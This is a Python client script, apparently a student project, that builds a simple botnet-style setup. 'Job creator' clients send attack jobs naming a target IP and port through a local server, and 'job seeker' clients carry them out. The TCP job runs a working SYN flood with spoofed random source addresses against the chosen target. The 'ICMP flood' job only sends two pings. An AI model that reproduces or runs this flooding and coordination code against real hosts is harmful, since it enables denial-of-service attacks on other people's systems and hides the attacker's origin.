# written by Jack Pistagnesi

import socket
import time
from scapy.all import *
from scapy.layers.inet import IP
from scapy.layers.inet import TCP
from icmplib import ping

# create socket
client = socket.socket()

# get ip
host = socket.gethostname()
hostip = socket.gethostbyname(host)

# connect to server
client.connect((hostip, 4321))

# Loop until either 'create' for job creator or 'seek' for job seeker is typed
print("Would you like this client to be a Job Creator or Job Seeker? Type 'create' or 'seek':  ")
while 1:
    data = input()
    if data == "create":
        print("To enter a message to send, type anything\nTo request to check if Host is online, type 'ipcheck'\n" +
              "To request to check the hosts status, type 'portstatus'\n" +
              "To request job seekers to start a TCP flood attack, type 'tcpAttack'\n" +
              "To request job seekers to start a ICMP flood attack, type 'icmpAttack'\n")
        # Constant loop that lets job creators send jobs and the job details (IP and port# for TCP Attack etc.) to the server
        while 1:
            data = input()

            if data == "tcpAttack":
                print("Give the port used for the attack: ")
                attackPort = input()
                print("Give the IP address you want to attack: ")
                attackIP = input()
                client.sendall(data.encode('ascii', 'strict'))
                time.sleep(1)
                client.sendall(attackPort.encode('ascii', 'strict'))
                time.sleep(1)
                client.sendall(attackIP.encode('ascii', 'strict'))

            elif data == "icmpAttack":
                print("Give the IP address you want to attack: ")
                attackIP = input()
                client.sendall(data.encode('ascii', 'strict'))
                time.sleep(1)
                client.sendall(attackIP.encode('ascii', 'strict'))

            else:
                client.sendall(data.encode('ascii', 'strict'))
                received = client.recv(1024).decode('ascii', 'strict')
                print(received)

    elif data == "seek":

        # constant loop that keeps job seekers looking for new jobs
        while 1:
            print("Waiting for job...")
            received = client.recv(1024).decode('ascii', 'strict')

            if received == "tcpAttack":
                attackPort = client.recv(1024).decode('ascii', 'strict')
                attackIP = client.recv(1024).decode('ascii', 'strict')
                print("TCP flooding for 5 seconds...")
                t = time.time() + 5

                try:
                    while time.time() < t:
                        packet = IP(src=RandIP(), dst=attackIP) / TCP(sport=1234, dport=int(attackPort), seq=1505066,
                                                                      flags="S")
                        send(packet)  # If an error appears when running tcpAttack try typing 'net start npcap' in
                                      # administrator console
                    print("5 second TCP flood attack done")
                except Exception:
                    print("Attack failed. Looks like something went wrong with the given IP or Port.")
                    pass

            elif received == "icmpAttack":
                IPtoPing = client.recv(1024).decode('ascii', 'strict')
                numOfPing = 2
                intervalOfPing = 5
                timeout = 60

                try:
                    pingData = ping(IPtoPing, numOfPing, intervalOfPing, timeout)
                    print("Ping address: ", pingData.address,
                          "\nPKTs Sent: ", pingData.packets_sent,
                          "\nPKTs Received: ", pingData.packets_received,
                          "\nIs Alive: ", pingData.is_alive)
                except Exception:
                    print("Attack failed. Looks like something went wrong with the given IP.")
                    pass

            else:
                print(received)
                if input() == "quit":
                    break
    else:
        print("Wrong input. Either type 'create' or 'seek':")
